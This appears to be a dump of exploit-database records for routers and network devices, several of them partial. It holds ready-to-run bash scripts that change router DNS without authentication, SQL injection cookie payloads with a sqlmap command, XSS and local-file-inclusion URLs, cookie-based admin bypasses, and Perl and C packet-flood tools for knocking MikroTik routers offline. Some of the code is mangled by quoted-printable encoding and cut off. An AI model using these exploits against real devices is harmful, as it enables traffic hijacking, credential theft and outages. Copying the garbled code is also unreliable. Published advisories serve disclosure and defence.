Product web page: http://www.dasannetworks.com | http://www.dasannetworks.eu
Affected version: Model: H640GR-02
H640GV-03
H640GW-02
H640RW-02
H645G
Firmware: 2.76-9999
2.76-1101
2.67-1070
2.45-1045
of Gigabit Ethernet downlink supporting 10/100/1000Base-T (RJ45). It
helps service providers to extend their core optical network all the
way to their subscribers, eliminating bandwidth bottlenecks in the
last mile. H64xx is integrated device that provide the high quality
Internet, telephony service (VoIP) and IPTV or OTT content for home
or office. H64xx enable the subscribers to make a phone call whose
quality is equal to PSTN at competitive price, and enjoy the high
quality resolution live video and service such as VoD or High Speed
Internet.
and authorization, allowing it to be bypassed through cookie manipulation.
Setting the Cookie 'Grant' with value 1 (user) or 2 (admin) will
bypass security controls in place enabling the attacker to take full
control of the device management interface.
Tested on: Server: lighttpd/1.4.31
Server: DasanNetwork Solution
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5421
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5421.php
19.05.2017
GET /cgi-bin/sysinfo.cgi HTTP/1.1
Host: 192.168.0.1:8080
Upgrade-Insecure-Requests: 1
User-Agent: Bond-James-Bond/007
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,mk;q=0.6
Cookie: Grant=1; Language=english; silverheader=3c
Connection: close"
2017-06-18,WebApps,Hardware,Todor Donev,D-Link DSL-2640B ADSL Router,'dnscfg' Remote DNS Change,"#!/bin/bash
#   D-Link ADSL DSL-2640B GE_1.07
#   Unauthenticated Remote DNS Change Exploit
#  Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""               D-Link ADSL DSL-2640B GE_1.07 ""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ===================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""      Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
2017-06-17,WebApps,Hardware,Todor Donev,Beetel BCM96338 Router,DNS Change,"#!/bin/bash
#   Beetel BCM96338 ADSL Router
#   Unauthenticated Remote DNS Change Exploit
#  Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#  Description:
#  The vulnerability exist in the web interface, which is
#  accessible without authentication.
#  Once modified, systems use foreign DNS servers,  which are
#  usually set up by cybercriminals. Users with vulnerable
#  systems or devices who try to access certain sites are
#  instead redirected to possibly malicious sites.
#  Modifying systems' DNS settings allows cybercriminals to
#  perform malicious activities like:
#    o  Steering unknowing users to bad sites:
#       These sites can be phishing pages that
#       spoof well-known sites in order to
#       trick users into handing out sensitive
#       information.
#    o  Replacing ads on legitimate sites:
#       Visiting certain sites can serve users
#       with infected systems a different set
#       of ads from those whose systems are
#       not infected.
#    o  Controlling and redirecting network traffic:
#       Users of infected systems may not be granted
#       access to download important OS and software
#       updates from vendors like Microsoft and from
#       their respective security vendors.
#    o  Pushing additional malware:
#       Infected systems are more prone to other
#       malware infections (e.g., FAKEAV infection).
#  Disclaimer:
#  This or previous programs is for Educational
#  purpose ONLY. Do not use it without permission.
#  The usual disclaimer applies, especially the
#  fact that Todor Donev is not liable for any
#  damages caused by direct or indirect use of the
#  information or functionality provided by these
#  programs. The author or any Internet provider
#  bears NO responsibility for content or misuse
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact
#  that any damage (dataloss, system crash,
#  system compromise, etc.) caused by the use
#  of these programs is not Todor Donev's
#  responsibility.
#  Use them at your own risk!","if [[ $# -gt 3 || $# -lt 2 ]]; then
echo ""               Beetel BCM96338 ADSL Router ""
echo ""           Unauthenticated Remote DNS Change Exploit""
echo ""  ===================================================================""
echo ""  Usage: $0 <Target> <Primary DNS> <Secondary DNS>""
echo ""  Example: $0 133.7.133.7 8.8.8.8""
echo ""  Example: $0 133.7.133.7 8.8.8.8 8.8.4.4""
echo """"
echo ""      Copyright 2017 (c) Todor Donev <todor.donev at gmail.com>""
echo ""  https://www.ethical-hacker.org/ https://www.fb.com/ethicalhackerorg""
exit;
fi
GET=`which GET 2>/dev/null`
if [ $? -ne 0 ]; then
echo ""  Error : libwww-perl not found =/""
exit;
fi
GET -e ""http://$1/dnscfg.cgi?dnsPrimary=$2&dnsSecondary=$3&dnsDynamic=0&dnsRefresh=1"" 0&> /dev/null <&1"
2017-06-06,WebApps,CGI,X41 D-Sec GmbH,Peplink Balance Routers 7.0.0-build1904,SQL Injection / Cross-Site Scripting / Information Disclosure,"https://ip/cgi-bin/MANGA/admin.cgi.
https://ip/cgi-bin/HASync/hasync.cgi?debug=1&syncid=123%3Cscript%3Ealert%281%29%3C/script%3E","X41 D-Sec GmbH Security Advisory: X41-2017-005
Multiple Vulnerabilities in peplink balance routers
Overview
Confirmed Affected Versions: 7.0.0-build1904
Confirmed Patched Versions:
fw-b305hw2_380hw6_580hw2_710hw3_1350hw2_2500-7.0.1-build2093.bin
Vulnerable Firmware:
fw-b305hw2_380hw6_580hw2_710hw3_1350hw2_2500-7.0.0-build1904.bin
Models: Balance Routers 305, 380, 580, 710, 1350, 2500
Vendor: Peplink
Vendor URL: https://www.peplink.com/
Vector: Network
Credit: X41 D-Sec GmbH, Eric Sesterhenn
Additional Credits: Claus Overbeck (Abovo IT)
Status: Public
Advisory-URL: https://www.x41-dsec.de/lab/advisories/x41-2017-005-peplink/
Summary and Impact
Several issues have been identified, which allow attackers to access the
administrative web interface with admin credentials, delete files,
perform CSRF and XSS attacks.
Product Description
From the vendor webpage:
Use Load Balancing and SpeedFusion bandwidth bonding to deliver
superfast VoIP, video streaming, and data using an SD-WAN enabled
network. Even with a basic Balance 20 dual-WAN router, you can mix
different transport technologies and providers to keep your network up
when individual links go down. Switching between links is automatic and
seamless.
SQL Injection via bauth Cookie
Severity Rating: Critical
Vector: Network
CVE: CVE-2017-8835
CWE: 89
CVSS Score: 9.8
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Summary and Impact
Peplink devices are vulnerable to an SQL injection attack via the bauth
cookie parameter which is set e.g. when accessing
The injection can be checked with the following command:
./sqlmap.py -u ""https://ip/cgi-bin/MANGA/admin.cgi""
--cookie=""bauth=csOWLxU4BvoMfhY2rHLVFm1EmZWV74zinla9IVclqrYxH16426647""
-p""bauth"" --level 5 --risk 3 --dbms sqlite --technique=BEUSQ
--flush-session -t trace.log --prefix ""'"" --suffix ""--"" -a
The vulnerability in the Peplink device allows to access the SQLite
session database containing user and session variables. By using the the
following cookie in a web request, it is possible to select a running
administrator session to be used for the attackers login.
bauth=-12' or id IN (select s.id from sessions as s left join
sessionsvariables as v on v.id=s.id where v.name='rwa' and v.value='1')
or '1'='2
By forming specialised SQL queries, it is possible to retrieve usernames
from the database. This worked by returning a valid session in case the
username existed and no session if it did not exist. In the first case
the server did not set a new session cookie in the response to the request.
SELECT id FROM sessions WHERE sessionid = '-14' or id IN (select s.id
from sessions as s left join sessionsvariables as v on v.id=s.id where
v.name='username' and substr(v.value,1,3)='adm')
Workarounds
Install vendor supplied update.
No CSRF Protection
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8836
CWE: 352
CVSS Score: 5.4
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
Summary and Impact
The CGI scripts in the administrative interface are not protected
against cross site request forgery attacks. This allows an attacker to
execute commands, if a logged in user visits a malicious website. This
can for example be used to change the credentials of the administrative
webinterface.
Workarounds
Install vendor supplied update.
Passwords stored in Cleartext
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8837
CWE: 256
CVSS Score: 4.0
CVSS Vector: CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Summary and Impact
The Peplink devices store passwords in cleartext in the files
/etc/waipass and /etc/roapass. In case one of these devices is
compromised the attacker can gain access to the cleartext passwords and
abuse them to compromise further systems.
Workarounds
Install vendor supplied update.
XSS via syncid Parameter
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8838
CWE: 80
CVSS Score: 5.4
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
Summary and Impact
If the webinterface is accessible, it is possible to abuse the syncid
parameter to trigger a cross-site-scripting issue by calling
This executes the JavaScript in the victims browser, which can be abused
to steal session cookies.
Workarounds
Install vendor supplied update.
XSS via preview.cgi
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8839
CWE: 80
CVSS Score: 5.4
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
Summary and Impact
If the webinterface is accessible, it is possible to abuse the the
orig_url parameter to trigger a cross-site-scripting issue in
/guest/preview.cgi. The injection is directly into existing JavaScript.
This executes the JavaScript in the victims browser, which can be abused
to steal session cookies.
Workarounds
Install vendor supplied update.
File Deletion
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8841
CWE: 73
CVSS Score: 6.5
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H
Summary and Impact
A logged in user can delete arbitrary files on the Peplink devices, by
abusing the /cgi-bin/MANGA/firmware_process.cgi. When an absolute path
is provided to the upfile.path parameter the file provided in the path
is deleted during the process. This can be abused to cause a denial of
service (DoS). In combination with the missing CSRF protection, this can
be abused remotely via a logged in user.
Workarounds
Install vendor supplied update.
Information Disclosure
Severity Rating: Medium
Vector: Network
CVE: CVE-2017-8840
CWE: 200
CVSS Score: 5.3
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
Summary and Impact
If the webinterface is accessible, it is possible to retrieve sensitive
information without a valid login by opening
cgi-bin/HASync/hasync.cgi?debug=1
This displays the following:
-----8<------------------------------------------------
Master LAN Address    = [ <internal ip> / <netmask> ]
Serial Number         = [ <serial number> ]
HA Group ID           = [ <group id> ]
Virtual IP            = [ <internal ip> / <netmask> ]
Submitted syncid      = [ <syncid> ]
-----8<------------------------------------------------
This information can be valuable for an attacker to exploit other issues.
Workarounds
Install vendor supplied update.
About X41 D-Sec GmbH
X41 D-Sec is a provider of application security services. We focus on
application code reviews, design review and security testing. X41 D-Sec
GmbH was founded in 2015 by Markus Vervier. We support customers in
various industries such as finance, software development and public
institutions.
Timeline
2017-04-07Issue found
2017-04-10Vendor asked for security contact
2017-04-11Vendor replied, send GPG key
2017-04-11Information supplied to vendor
2017-04-11Vendor acknowledges that the information is received
2017-04-17Vendor acknowledges SQL injection
2017-05-08CVE IDs for all issues requested
2017-05-08CVE IDs assigned
2017-05-11Vendor informed about CVE IDs
2017-05-29Version provided to X41 for testing
2017-05-31First test results send back to the vendor
2017-06-01Remaining test results send back to the vendor
2017-06-05Coordinated Firmware and Advisory release"
2017-05-26,WebApps,Hardware,Touhid M.Shaikh,QWR-1104 Wireless-N Router,Cross-Site Scripting,"# Exploit Title: Aries QWR-1104 Wireless-N Router Execute JavaScript in Wireless Site Survey page.
# Date: 26-05-2017
# Vendor Homepage : http://www.ariesnetworks.net/
# Firmware Version: WRC.253.2.0913
# Exploit Author: Touhid M.Shaikh
# Contact: http://twitter.com/touhidshaikh22
# Website: http://touhidshaikh.com/
# Category: Hardware
##### Video PoC and Blog Post #####
https://www.youtube.com/watch?v=jF47XQQq26o
www.touhidshaikh.com/blog
##### Description ######
##### POC #######
#### my Hotspot's name : t<script>prompt(2)</script>
### Target Servey page After Execute my Javascript ####
######################################## PoC End Here ################################
######## Thanks","Aries QWR-1104 Wireless-N Router this is home based router. this router provide some extra feature like WDS, Brigeding etc. while connectting another network admin must monitor network around using  Site servey page which is vulnerable to Execute malicious JavaScript code remoting in Wireless Site Survey page.
Make a Hotspot using any device. In Hotspot's Accss point name field, Put your malicious javascript code as a name of you hotspot.
When Target Router's monitors routers around. your Malicious hotspot named router log in target's Site survey page and your hotspot javascript code executed as a javascript.(make sure doing this you whitin a target's network range.)
<tr><td bgcolor=""#C0C0C0"" align=""center"" width=""20%""><pre><font size=""2"">t<script>prompt(2)</script></font></pre></td>
<td bgcolor=""#C0C0C0"" align=""center"" width=""20%""><font size=""2"">02:1a:11:f8:**:**</font></td>
<td bgcolor=""#C0C0C0"" align=""center"" width=""10%""><font size=""2"">11 (B+G+N)</font></td>
<td bgcolor=""#C0C0C0"" align=""center"" width=""20%""><font size=""2"">AP</font></td>
<td bgcolor=""#C0C0C0"" align=""center"" width=""10%""><font size=""2"">no</font></td>
<td bgcolor=""#C0C0C0"" align=""center"" width=""10%""><font size=""2"">38</font></td>
</tr>
Pratik K.Tejani, Rehman, Taushif,Charles Babbage and all my friends ................"
2017-05-02,WebApps,Hardware,ReverseBrain,Zyxel P-660HW-61 Firmware < 3.40(PE.11)C0 Router,Local File Inclusion,"# Exploit Title: Zyxel P-660HW-61 < 3.40(PE.11)C0 - Local File Inclusion
# Date: 2-05-2017
# Exploit Author: ReverseBrain
# Contact: https://www.twitter.com/ReverseBrain
# Vendor Homepage: https://www.zyxel.com
# Software Link: ftp://ftp.zyxel.com/P-660HW-61/firmware/P-660HW-61_3.40(PE.11)C0.zip
# Version: 3.40(PE.11)C0
http://ROUTER_IP/cgi-bin/webcm?getpage=/etc/passwd","1. Description
Any user who can login into the router can exploit the Local File Inclusion
reading files stored inside the device.
2. Proof of Concept
Login into the router and use the path of a file you want to read as
getpage parameter. For example:"
2017-03-28,DoS,Hardware,FarazPajohan,MikroTik RouterBoard 6.38.5,Denial of Service,#!/usr/local/bin/perl,"use Socket;
$src_host =3D $ARGV[0];=20
$src_port =3D $ARGV[1];=20
$dst_host =3D $ARGV[2];=20
$dst_port =3D $ARGV[3];=20
if(!defined $src_host or !defined $src_port or !defined $dst_host or !defin=
ed $dst_port)=20
=09
=09print ""Usage: $0 <source host> <source port> <dest host> <dest port>\n"";
=09exit;
}=20
else=20
=09
=09main();
=20
sub main=20
=09my $src_host =3D (gethostbyname($src_host))[4];
=09my $dst_host =3D (gethostbyname($dst_host))[4];
=09$IPROTO_RAW =3D 255;
=09socket($sock , AF_INET, SOCK_RAW, $IPROTO_RAW)=20
=09=09or die $!;
=09my ($packet) =3D makeheaders($src_host, $src_port, $dst_host, $dst_port)=
=09my ($destination) =3D pack('Sna4x8', AF_INET, $dst_port, $dst_host);
=09while(1)
=09{
=09=09send($sock , $packet , 0 , $destination)
=09=09=09or die $!;
=09}
sub makeheaders=20
=09$IPPROTO_TCP =3D 6;
=09local($src_host , $src_port , $dst_host , $dst_port) =3D @_;
=09my $zero_cksum =3D 0;
=09my $tcp_len =3D 20;
=09my $seq =3D 19456;
=09my $seq_ack =3D 0;
=09my $tcp_doff =3D ""5"";
=09my $tcp_res =3D 0;
=09my $tcp_doff_res =3D $tcp_doff . $tcp_res;
=09my $tcp_urg =3D 0;=20
=09my $tcp_ack =3D 0;
=09my $tcp_psh =3D 0;
=09my $tcp_rst =3D 1;
=09my $tcp_syn =3D 0;
=09my $tcp_fin =3D 0;
=09my $null =3D 0;
=09my $tcp_win =3D 124;
=09my $tcp_urg_ptr =3D 44;
=09my $tcp_flags =3D $null . $null . $tcp_urg . $tcp_ack . $tcp_psh . $tcp_=
rst . $tcp_syn . $tcp_fin ;
=09my $tcp_check =3D 0;
=09my $tcp_header =3D pack('nnNNH2B8nvn' , $src_port , $dst_port , $seq, $s=
eq_ack , $tcp_doff_res, $tcp_flags,  $tcp_win , $tcp_check, $tcp_urg_ptr);
=09my $tcp_pseudo =3D pack('a4a4CCn' , $src_host, $dst_host, 0, $IPPROTO_TC=
P, length($tcp_header) ) . $tcp_header;
=09$tcp_check =3D &checksum($tcp_pseudo);
=09my $tcp_header =3D pack('nnNNH2B8nvn' , $src_port , $dst_port , $seq, $s=
eq_ack , $tcp_doff_res, $tcp_flags,  $tcp_win , $tcp_check, $tcp_urg_ptr);
=09my $ip_ver =3D 4;
=09my $ip_len =3D 5;
=09my $ip_ver_len =3D $ip_ver . $ip_len;
=09my $ip_tos =3D 00;
=09my $ip_tot_len =3D $tcp_len + 20;
=09my $ip_frag_id =3D 19245;
=09my $ip_ttl =3D 25;
=09my $ip_proto =3D $IPPROTO_TCP;=09
=09my $ip_frag_flag =3D ""010"";
=09my $ip_frag_oset =3D ""0000000000000"";
=09my $ip_fl_fr =3D $ip_frag_flag . $ip_frag_oset;
=09my $ip_header =3D pack('H2CnnB16CCna4a4',=09$ip_ver_len, $ip_tos, $ip_to=
t_len, $ip_frag_id,=09$ip_fl_fr , $ip_ttl , $ip_proto , $zero_cksum , $src_=
host , $dst_host);
=09my $pkt =3D $ip_header . $tcp_header;
=09return $pkt;
sub checksum=20
=09my ($msg) =3D @_;
=09my ($len_msg,$num_short,$short,$chk);
=09$len_msg =3D length($msg);
=09$num_short =3D $len_msg / 2;
=09$chk =3D 0;
=09
=09foreach $short (unpack(""S$num_short"", $msg))=20
=09{
=09=09$chk +=3D $short;
=09}
=09
=09$chk +=3D unpack(""C"", substr($msg, $len_msg - 1, 1)) if $len_msg % 2;
=09$chk =3D ($chk >> 16) + ($chk & 0xffff);
=09
=09return(~(($chk >> 16) + $chk) & 0xffff);
}=20"
2017-03-18,WebApps,Hardware,Indrajith.A.N,DIGISOL DG-HR1400 1.00.02 Wireless Router,Privilege Escalation,"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6896
https://vuldb.com/sv/?id.97954
https://www.indrajithan.com/DIGISOL_router_previlage_escaltion","Title:
Cookie based privilege escalation in DIGISOL DG-HR1400 1.00.02 wireless router.
CVE Details:
CVE-2017-6896
Reference:
Credit:
Name: Indrajith.A.N
Website: https://www.indrajithan.com
Date:
13-03-2017
Vendor:
DIGISOL router is a product of Smartlink Network Systems Ltd. is one of India's leading networking company. It was established in the year 1993 to prop the Indian market in the field of Network Infrastructure.
Product:
DIGISOL DG-HR1400 is a wireless Router
Product link: http://wifi.digisol.com/datasheets/DG-HR1400.pdf
Abstract details:
privilege escalation vulnerability in the DIGISOL DG-HR1400 wireless router enables an attacker escalate his user privilege to an admin just by modifying the Base64encoded session cookie value
Affected Version:
<=1.00.02
Exploitation-Technique:
Remote
Severity Rating:
8
Proof Of Concept :
1) Login to the router as a User where router sets the session cookie value to VVNFUg== (Base64 encode of ""USER"")
2) So Encode ""ADMIN"" to base64 and force set the session cookie value to QURNSU4=
3) Refresh the page and you are able to escalate your USER privileges to ADMIN.
Disclosure Timeline:
Vendor Notification: 13/03/17"
2017-03-05,DoS,Hardware,FarazPajohan,MikroTik Router,ARP Table OverFlow Denial Of Service,"#Exploit Title: MikroTik Router Denial Of Service | ARP Table OverFlow
#Exploit Author: Hosein Askari (FarazPajohan)
#Vendor HomePage: https://mikrotik.com/
#Affected Series: Hap Lite
#Version: 6.25
#Tested on: Parrot Security OS
#Date: 04-3-2017
#Category: Network Appliance
#Vulnerable Part: TCP Stack
#Author Mail :hosein.askari@aol.com
#Reference: https://cxsecurity.com/issue/WLB-2017030029
#CVE:2017-6444
#Description:
#The MikroTik Router has not protection mechanism for the case of a fast network connection which allows remote attackers to cause a denial of service (CPU consumption) by #sending many #TCP ACK packets. after the attacker stops the exploit , the CPU usage is 100% and the router should be reboot again for working normally.
#Exploit Command :
# ~~~#exploit.out -T0 -h <MikroTik_ip> -p [23,23]
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#ifdef F_PASS
#include <sys/stat.h>
#endif
#include <netinet/in_systm.h>
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#ifndef __USE_BSD
# define __USE_BSD
#endif
#ifndef __FAVOR_BSD
# define __FAVOR_BSD
#endif
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#ifdef LINUX
# define FIX(x) htons(x)
#else
# define FIX(x) (x)
#endif
#define TCP_ACK 1
#define TCP_FIN 2
#define TCP_SYN 4
#define TCP_RST 8
#define UDP_CFF 16
#define ICMP_ECHO_G 32
#define TCP_NOF 64
#define TCP_URG 128
#define TH_NOF 0x0
#define TCP_ATTACK() (a_flags & TCP_ACK ||\
#define UDP_ATTACK() (a_flags & UDP_CFF)
#define ICMP_ATTACK() (a_flags & ICMP_ECHO_G)
#define CHOOSE_DST_PORT() dst_sp =3D=3D 0 ?\
#define CHOOSE_SRC_PORT() src_sp =3D=3D 0 ?\
#define KET() if (sendto(rawsock,\
#define BANNER_CKSUM 54018
#ifdef F_PASS
#endif
#define RANDOM() (int) random() % 255 +1","a_flags & TCP_FIN ||\
a_flags & TCP_SYN ||\
a_flags & TCP_RST ||\
a_flags & TCP_NOF ||\
a_flags & TCP_URG )
random () :\
htons(dst_sp + (random() % (dst_ep -dst_sp +1)));
random () :\
htons(src_sp + (random() % (src_ep -src_sp +1)));
&packet,\
(sizeof packet),\
0,\
(struct sockaddr *)&target,\
sizeof target) < 0) {\
perror(""sendto"");\
exit(-1);\
u_long lookup(const char *host);
unsigned short in_cksum(unsigned short *addr, int len);
static void inject_iphdr(struct ip *ip, u_char p, u_char len);
char *class2ip(const char *class);
static void send_tcp(u_char th_flags);
static void send_udp(u_char garbage);
static void send_icmp(u_char garbage);
char *get_plain(const char *crypt_file, const char *xor_data_key);
static void usage(const char *argv0);
u_long dstaddr;
u_short dst_sp, dst_ep, src_sp, src_ep;
char *src_class, *dst_class;
int a_flags, rawsock;
struct sockaddr_in target;
const char *banner =3D ""Written By C0NSTANTINE"";
struct pseudo_hdr {
u_long saddr, daddr;
u_char mbz, ptcl;
u_short tcpl;
struct cksum {
struct pseudo_hdr pseudo;
struct tcphdr tcp;
struct {
int gv;
int kv;
void (*f)(u_char);
} a_list[] =3D {
{ TCP_ACK, TH_ACK, send_tcp },
{ TCP_FIN, TH_FIN, send_tcp },
{ TCP_SYN, TH_SYN, send_tcp },
{ TCP_RST, TH_RST, send_tcp },
{ TCP_NOF, TH_NOF, send_tcp },
{ TCP_URG, TH_URG, send_tcp },
{ UDP_CFF, 0, send_udp },
{ ICMP_ECHO_G, ICMP_ECHO, send_icmp },
{ 0, 0, (void *)NULL },
int
main(int argc, char *argv[])
int n, i, on =3D 1;
int b_link;
struct stat sb;
unsigned int until;
a_flags =3D dstaddr =3D i =3D 0;
dst_sp =3D dst_ep =3D src_sp =3D src_ep =3D 0;
until =3D b_link =3D -1;
src_class =3D dst_class =3D NULL;
while ( (n =3D getopt(argc, argv, ""T:UINs:h:d:p:q:l:t:"")) !=3D -1) {
char *p;
switch (n) {
case 'T':
switch (atoi(optarg)) {
case 0: a_flags |=3D TCP_ACK; break;
case 1: a_flags |=3D TCP_FIN; break;
case 2: a_flags |=3D TCP_RST; break;
case 3: a_flags |=3D TCP_SYN; break;
case 4: a_flags |=3D TCP_URG; break;
break;
case 'U':
a_flags |=3D UDP_CFF;
break;
case 'I':
a_flags |=3D ICMP_ECHO_G;
break;
case 'N':
a_flags |=3D TCP_NOF;
break;
case 's':
src_class =3D optarg;
break;
case 'h':
dstaddr =3D lookup(optarg);
break;
case 'd':
dst_class =3D optarg;
i =3D 1;
break;
case 'p':
if ( (p =3D (char *) strchr(optarg, ',')) =3D=3D NULL)
usage(argv[0]);
dst_sp =3D atoi(optarg);
dst_ep =3D atoi(p +1);
break;
case 'q':
if ( (p =3D (char *) strchr(optarg, ',')) =3D=3D NULL)
usage(argv[0]);
src_sp =3D atoi(optarg);
src_ep =3D atoi(p +1);
break;
case 'l':
b_link =3D atoi(optarg);
if (b_link <=3D 0 || b_link > 100)
usage(argv[0]);
break;
case 't':
until =3D time(0) +atoi(optarg);
break;
default:
usage(argv[0]);
break;
if ( (!dstaddr && !i) ||
(dstaddr && i) ||
(!TCP_ATTACK() && !UDP_ATTACK() && !ICMP_ATTACK()) ||
(src_sp !=3D 0 && src_sp > src_ep) ||
(dst_sp !=3D 0 && dst_sp > dst_ep))
usage(argv[0]);
srandom(time(NULL) ^ getpid());
if ( (rawsock =3D socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
perror(""socket"");
exit(-1);
if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL,
(char *)&on, sizeof(on)) < 0) {
perror(""setsockopt"");
exit(-1);
target.sin_family =3D AF_INET;
for (n =3D 0; ; ) {
if (b_link !=3D -1 && random() % 100 +1 > b_link) {
if (random() % 200 +1 > 199)
usleep(1);
continue;
for (i =3D 0; a_list[i].f !=3D NULL; ++i) {
if (a_list[i].gv & a_flags)
a_list[i].f(a_list[i].kv);
if (n++ =3D=3D 100) {
if (until !=3D -1 && time(0) >=3D until) break;
n =3D 0;
exit(0);
u_long
lookup(const char *host)
struct hostent *hp;
if ( (hp =3D gethostbyname(host)) =3D=3D NULL) {
perror(""gethostbyname"");
exit(-1);
return *(u_long *)hp->h_addr;
char *
class2ip(const char *class)
static char ip[16];
int i, j;
for (i =3D 0, j =3D 0; class[i] !=3D '{TEXTO}'; ++i)
if (class[i] =3D=3D '.')
++j;
switch (j) {
case 0:
sprintf(ip, ""%s.%d.%d.%d"", class, RANDOM(), RANDOM(), RANDOM());
break;
case 1:
sprintf(ip, ""%s.%d.%d"", class, RANDOM(), RANDOM());
break;
case 2:
sprintf(ip, ""%s.%d"", class, RANDOM());
break;
default: strncpy(ip, class, 16);
break;
return ip;
unsigned short
in_cksum(unsigned short *addr, int len)
int nleft =3D len;
int sum =3D 0;
unsigned short *w =3D addr;
unsigned short answer =3D 0;
while (nleft > 1) {
sum +=3D *w++;
nleft -=3D 2;
if (nleft =3D=3D 1) {
*(unsigned char *) (&answer) =3D *(unsigned char *)w;
sum +=3D answer;
sum =3D (sum >> 16) + (sum & 0xffff);
sum +=3D (sum >> 16);
answer =3D ~sum;
return answer;
static void
inject_iphdr(struct ip *ip, u_char p, u_char len)
ip->ip_hl =3D 5;
ip->ip_v =3D 4;
ip->ip_p =3D p;
ip->ip_tos =3D 0x08; /* 0x08 */
ip->ip_id =3D random();
ip->ip_len =3D len;
ip->ip_off =3D 0;
ip->ip_ttl =3D 255;
ip->ip_dst.s_addr =3D dst_class !=3D NULL ?
inet_addr(class2ip(dst_class)) :
dstaddr;
ip->ip_src.s_addr =3D src_class !=3D NULL ?
inet_addr(class2ip(src_class)) :
random();
target.sin_addr.s_addr =3D ip->ip_dst.s_addr;
static void
send_tcp(u_char th_flags)
struct cksum cksum;
struct packet {
struct ip ip;
struct tcphdr tcp;
} packet;
memset(&packet, 0, sizeof packet);
inject_iphdr(&packet.ip, IPPROTO_TCP, FIX(sizeof packet));
packet.ip.ip_sum =3D in_cksum((void *)&packet.ip, 20);
cksum.pseudo.daddr =3D dstaddr;
cksum.pseudo.mbz =3D 0;
cksum.pseudo.ptcl =3D IPPROTO_TCP;
cksum.pseudo.tcpl =3D htons(sizeof(struct tcphdr));
cksum.pseudo.saddr =3D packet.ip.ip_src.s_addr;
packet.tcp.th_flags =3D random();
packet.tcp.th_win =3D random();
packet.tcp.th_seq =3D random();
packet.tcp.th_ack =3D random();
packet.tcp.th_off =3D 5;
packet.tcp.th_urp =3D 0;
packet.tcp.th_sport =3D CHOOSE_SRC_PORT();
packet.tcp.th_dport =3D CHOOSE_DST_PORT();
cksum.tcp =3D packet.tcp;
packet.tcp.th_sum =3D in_cksum((void *)&cksum, sizeof(cksum));
SEND_PACKET();
static void
send_udp(u_char garbage)
struct packet {
struct ip ip;
struct udphdr udp;
} packet;
memset(&packet, 0, sizeof packet);
inject_iphdr(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
packet.ip.ip_sum =3D in_cksum((void *)&packet.ip, 20);
packet.udp.uh_sport =3D CHOOSE_SRC_PORT();
packet.udp.uh_dport =3D CHOOSE_DST_PORT();
packet.udp.uh_ulen =3D htons(sizeof packet.udp);
